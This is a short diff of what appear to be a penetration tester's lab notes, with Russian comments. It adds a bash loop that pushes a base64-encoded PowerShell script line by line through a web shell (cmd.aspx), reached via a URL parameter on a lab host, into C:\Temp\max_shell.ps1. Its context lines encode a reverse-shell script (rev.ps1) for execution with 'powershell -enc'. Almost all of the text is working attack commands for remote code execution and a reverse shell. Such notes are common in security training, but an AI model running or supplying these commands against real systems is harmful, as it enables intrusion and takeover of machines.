@@ -30,7 +30,18 @@ $SecPassword)
 
   $Decode =[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded2))
   
+# Загрузка скрипат построчно
 
+!/bin/bash
+export IFS=$'\n'
+for line in $(cat tmp.ps1.b64);
+do
+max="echo ${line} >> C:\Temp\max_shell.ps1"
+curl -v -G -X GET 'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx' --data-urlencode "xcmd=$max"
+done
+
+
+-------------------------------------
 cat rev.ps1 |iconv -t UTF-16LE | base64 -w 0 (вывод)
 
 powershell -enc (вывод)
